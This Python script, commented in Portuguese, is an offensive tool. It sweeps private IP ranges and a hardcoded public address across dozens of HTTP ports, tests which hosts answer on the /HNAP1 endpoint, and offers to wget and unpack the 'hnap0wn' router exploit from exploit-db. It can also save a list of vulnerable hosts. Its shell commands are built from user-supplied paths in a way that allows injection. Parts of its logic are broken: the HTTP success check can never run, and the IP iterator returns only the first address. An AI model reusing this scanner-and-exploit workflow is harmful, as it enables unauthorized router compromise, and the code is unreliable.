#!/bin/python3

import sys
import requests
import os
import survey   #Para instalar o Survey: pip install survey
import sys
import colorama #Para instalar o Colorama: pip install colorama
from colorama import Fore,Back,Style
from tqdm import tqdm ##Para instalar o tqdm: pip install tqdm
import argparse
import logging

import threading
import time

######## Banner ########

def banner():
        print("""
{white}         ===============        =============     ==============      =======   ========  {reset}
{white}         \\{red}%.%.%.%.%.%.%.{white}\\     //{red}.%.%.%.%.%.%.{white}\\   //{red}.%.%.%.%.%.%.{white}\\  \\{red} {white}||{red}.%.%.{white}\\  /{red}%.%.%{white}||{reset}
{white}         ||{red}.%.%.{white}_____{red}.%.%.{white}|| ||{red}.%.%.{white}_____{red}.%.%.{white}|| ||{red}.%.%.{white}_____{red}.%.%.{white}|| ||{red}%.%.%.{white}\/{red}%.%.%.{white}||     {reset}
{white}         ||{red}%.%.{white}||   ||{red}.%.%{white}|| ||{red}%.%.{white}||   ||{red}.%.%{white}|| ||{red}%.%.{white}||   ||{red}.%.%{white}|| ||{red}.%.%.%.%.%.%.%{white}|| {reset}
{white}         ||{red}.%.%{white}||   ||{red}%.%.{white}|| ||{red}.%.%{white}||   ||{red}%.%.{white}|| ||{red}.%.%{white}||   ||{red}%.%.{white}|| ||{red}%.%{white}|{red}%.%.%.%.%.{white}||     {reset}
{white}         ||{red}%.%.{white}||   ||{red}.%_{white}-|| ||-_{red}%.{white}||   ||{red}.%.{white} || ||{red}%.%.{white}||   ||{red}.%{white}_-|| ||-_{red}.{white}|\{red}%.%.%.%.%{white}||     {reset}
{white}         ||{red}.%.%{white}||   ||-'  {white}|| ||  {white}`-||   {white}||{red}%.%.{white}|| ||{red}.%.%{white}||   ||-'  {white}|| ||  {white}`|\_{red}%.%.{white}|{red}.%.{white}||      {reset}
{white}         ||{red}%.%{white}_||   ||    {white}|| ||    {white}||   ||_ . {white}|| || {white}. _||   ||    {white}|| ||   |\ {white}`-_/| . ||    {reset}
{white}         ||{white}_-' ||  .|/    || ||    \|.  || `-_|| ||_-' ||  .|/    || ||   | \  / |-_.||   {reset}
{white}         ||    {white}||_-'      || ||      `-_||    || ||    ||_-'      || ||   | \  / |  `||   {reset}
{white}         ||    {white}`'         || ||         `'    || ||    `'         || ||   | \  / |   ||   {reset}
{white}         ||            {white}.===' `===.         .==='.`===.         .===' /==. |  \/  |   ||   {reset}
{white}         ||         {white}.=='   \_|-_ `===. .==='   _|_   `===. .===' _-|/   `==  \/  |   ||   {reset}
{white}         ||      {white}.=='    _-'    `-_  `='    _-'   `-_    `='  _-'   `-_  /|  \/  |   ||   {reset}
{white}         ||   {white}.=='    _-'          `-__\._-'         `-_./__-'         `' |. /|  |   ||   {reset}
{white}         ||.=='    _-'                                                     `' |  /==.||  {reset}
{white}         =='    _-'                                                            \/   `==  {reset}
{white}         \   _-'                                                                `-_   /  {reset}
{white}          `''                                                                      ``'   {reset}
{white}================================================================================================================{reset}
{white}        |{green}OPEN-SOURCE PROJECT | https://github.com/PadawanJB/publicos/blob/main/HNAP_Scan.py{white}|               {reset}
{white}        |{green}By PadawanJB                                                                      {white}|               {reset}
{white}        |{red}Não utilize dois parametros ao mesmo tempo, isto resultará em mal funcionamento   {white}|         {white}
{white}================================================================================================================{reset}
""".format(red=Fore.RED,yellow=Fore.YELLOW,green=Fore.GREEN,blue=Fore.BLUE,pink=Fore.MAGENTA,white=Fore.WHITE,reset=Style.RESET_ALL,bright=Style.BRIGHT))

######## Definindo wordlists ########

IP8 = open('/home/kali/tools/Wordlist/All-Ipv4-ClassA-10.10.txt')
IP12 = open('/home/kali/tools/Wordlist/All-Ipv4-ClassB-172.16.txt')
IP10 = open('/home/kali/tools/Wordlist/All-Ipv4-CGNAT-100.64.txt')
IP16 = open('/home/kali/tools/Wordlist/All-Ipv4-ClassC-192.168.txt')
IP1 = ["177.131.11.217"]
port = ["66", "80", "81", "443", "445", "457", "1080", "1100", "1241", "1352", "1433", "1434", "1521", "1944", "2301", "3000", "3128", "3306", "4000", "4001", "4002", "4100", "5000", "5432", "5800", "5801", "5802", "6346", "6347", "7001", "7002", "8080", "8081", "8082", "8083", "8084", "8085", "8086", "8087", "8088", "8089", "8090", "8443", "8888", "30821"]
#port = open('wordlist/common-http-ports-copia.txt')
httplist = []
hnaplist = []

#_#_#_#_ Definição de argumentos #_#_#_#_

#arg1 = sys.argv[1]
parser = argparse.ArgumentParser(description='Efetua um scan HTTP, os hosts que obtiverem acesso HTTP são então adicionados em uma lista de acesso HNAP para que seja efetuada a execução do exploit.', exit_on_error=False)

parser.add_argument('-8', '--pri8', action='store_true', help='Use -8 para a faixa de IP privado 10.0.0.0/8.')
parser.add_argument('-10', '--cgnat', action='store_true', help='Use -10 para a faixa de IP privado 100.64.0.0/10.')
parser.add_argument('-12', '--pri12', action='store_true', help='Use -12 para a faixa de IP privado 172.16.0.0/12.')
parser.add_argument('-16', '--pri16', action='store_true', help='Use -16 para a faixa de IP privado 192.168.0.0/16.')
parser.add_argument('-t', '--teste', action='store_true', help='Efetua o teste em um IP especifico.')

try:
        args = parser.parse_args()
        pass
except argparse.ArgumentError:
        print('Digite "-h" ou "--help" para verificar às opções disponives.')
#       print("Argumento inváido.")
#       exit()
#else:
#       exit()

if args.pri8 == True:
        arg1 = "-8"
elif args.cgnat == True:
        arg1 = "-10"
elif args.pri12 == True:
        arg1 = "-12"
elif args.pri16 == True:
        arg1 = "-16"
elif args.teste == True:
        arg1 = "-t"
else:
        print('Digite "-h" ou "--help" para verificar às opções disponives.')
        exit()

######## Definindo variaveis ########

portnun = 0
ipnum = 0

if arg1 == "-8" or arg1 == "-16":
        ipcar = 64770 #Padrão=64770
elif arg1 == "-10":
        ipcar = 4226880 #Padrão=4226880
elif arg1 == "-12":
        ipcar = 1105680 #Padrão=1105680
elif arg1 == "-t":
        ipcar = 1

if arg1 == "-8" or arg1 == "-10" or arg1== "-12" or arg1 == "-16":
        portcar = 45 #Padrão=45
elif arg1 == "-t":
        portcar = 1

######## Definindo formato de log ########

log_format = '%(asctime)s:%(message)s'
logging.basicConfig(format=log_format, level=logging.INFO)

######## Criando modulos ########

def iptocheck():
        if arg1 == "-8":
                for lineip in IP8:
                        lineip = lineip.strip()
                        ip_to_check = f"http://{lineip}"
                        return ip_to_check
                else:
                        pass

        if arg1 == "-10":
                for lineip in IP10:
                        lineip = lineip.strip()
                        ip_to_check = f"http://{lineip}"
                        return ip_to_check
                else:
                        pass

        if arg1 == "-16":
                for lineip in IP16:
                        lineip = lineip.strip()
                        ip_to_check = f"http://{lineip}"
                        return ip_to_check
                else:
                        pass

        if arg1 == "-12":
                for lineip in IP12:
                        lineip = lineip.strip()
                        ip_to_check = f"http://{lineip}"
                        return ip_to_check
                else:
                        pass

        if arg1 == "-t":
                for lineip in IP1:
                        lineip = lineip.strip()
                        ip_to_check = f"http://{lineip}"
                        return ip_to_check
                else:
                        pass

def testehttp():
        def funcao_thread(porttest):
                ip_to_check = iptocheck()
                logging.info(f"Testanto {ip_to_check}.\r")
                for lineport in range(len(port)):
                        porttest = port[lineport]
                        ipport_to_check = f"{ip_to_check}:{porttest}"
#                       tqdm.write(f"Testanto {ipport_to_check}.", end="\n", nolock=False)
#                       msg = tqdm.write(f"Testanto {ipport_to_check}.", end="\n", nolock=False)
#                       logging.info(f"{msg}")
#                       IP.append("google.com") #Adiciona o Google a lista de teste HTTP para efetuar o teste em redes onde o acesso HTTP é bloqueado.
                        try:
                                r = requests.get(f"{ipport_to_check}", timeout=2)
                                break
                        except:
                                continue
                        if (r.status_code == 200 or r.status_code == 301):
#                       if (r.status_code == 400):
                                tqdm.write(f"Sucesso ao acessar {ipport_to_check}, status code: {r.status_code}", end="\n", nolock=False)
                                tqdm.write(f"Adicionando {ipport_to_check}/ a lista de teste HNAP...", end="\n", nolock=False)
#                               print(f"Sucesso ao acessar {ipport_to_check}, status code: {r.status_code}")
#                               print(f"Adicionando {ipport_to_check}/ a lista de teste HNAP...")
                                httplist.append(f"{ipport_to_check}")
                        else:
                                continue
        if __name__ == "__main__":
                format = "%(asctime)s: %(message)s"
                logging.basicConfig(format=format, level=logging.INFO, datefmt="%H:%M:%S")
                threads = list()
                for nunthreads in range(4):
                        x = threading.Thread(target=funcao_thread, args=(nunthreads,))
                        threads.append(x)
                        x.start()
        for index, thread in enumerate(threads):
                thread.join()

def testehnap():
        execcurl1 = "curl -s -o /dev/null -w %{http_code} "
        execcurl2 = f"{iphttpslist}/HNAP1 > /dev/null 2>&1"
        execcurl = execcurl1 + execcurl2
        status_code =  os.system(execcurl)
        if(status_code == 0):
                hnaplist.append(f"{iphttpslist}, ")
                print(f"IP {iphttpslist} adicionado a lista de acesso HNAP.")
        else:
                pass

def exploitnhap():
#       pergunta1 = input("Deseja baixar o 'hnap0wn?' [Y or N] ")
        pergunta1 = survey.confirm('Deseja baixar o "hnap0wn"? ', default = True)
#       if pergunta1 == "y" or pergunta1 == "Y":
        if pergunta1 == True:
#               diretorio1 = input("Informe o diretório que deseja instalar: ")
                diretorio1 = survey.path('/home/', 'Informe o diretório que deseja instalar: ')
                os.system(f"mkdir {diretorio1}/hnap0wn")
                os.system(f"cd {diretorio1}/hnap0wn")
                os.system(f"wget -P {diretorio1}/hnap0wn https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/11101.tar.gz")
                os.system(f"sudo tar -xf {diretorio1}/hnap0wn/11101.tar.gz -C {diretorio1}hnap0wn/")
                print("Download concluido com sucesso!!")
                print("Para mais informações de como utilizar o software acesse https://miloserdov.org/?p=5256.")
#               pergunta2 = input("Deseja salvar a lista de IPs que possuem a vulnerabilidade? [Y or N] ")
                pergunta2 = survey.confirm('Deseja salvar a lista de IPs que possuem a vulnerabilidade? ', default = False)
                if pergunta2 == True:
                        f = open("HNAP_IP_Lins.txt", "x")
                        f = open("HNAP_IP_Lins.txt", "a")
                        f.write(f"{hnaplist}")
                        f.close()
                        print(f'Lista salva em "HNAP_IP_Lins.txt"')
                elif pergunta2 == False:
                        pass
                else:
                        print("Opção inválida.")
#       elif pergunta1 == "n" or pergunta1 == "N":
        elif pergunta1 == False:
                pergunta2 = survey.confirm('Deseja salvar a lista de IPs que possuem a vulnerabilidade? ', default = False)
                if pergunta2 == True:
                        f = open("HNAP_IP_Lins.txt", "x")
                        f = open("HNAP_IP_Lins.txt", "a")
                        f.write(f"{hnaplist}")
                        f.close()
                        print(f'Lista salva em "HNAP_IP_Lins.txt"')
                elif pergunta2 == False:
                        pass
                else:
                        print("Opção inválida.")
        else:
                print("Opção inválida.")

def limpartela():
        os.system("clear")
        banner()

######## Inicio do código ########

limpartela()

with tqdm(total=ipcar, position=0, leave=True) as barra_progresso:
#       tqdm.set_lock(lock)
        if (ipnum/64770) <= 1:
                while(ipnum <= ipcar):
                        if(portnun <= portcar):
                                limpartela()
                                barra_progresso.update(4)
                                ipnum = ipnum+4
                                testehttp()
                        elif(portnun >= portcar):
                                portnun=0
                                pass
                        else:
                                portnun=0
                                pass
                else:
                        pass
        elif ipcar/64770 == 1:
                pass
        else:
                print("Saida errada.")

for iphttpslist in tqdm(httplist):
        iphttpslist = str(iphttpslist)
        iphttpslist = iphttpslist.strip()
        testehnap()
else:
        pass

exploitnhap()

print(f"Que a Força esteja com você...")
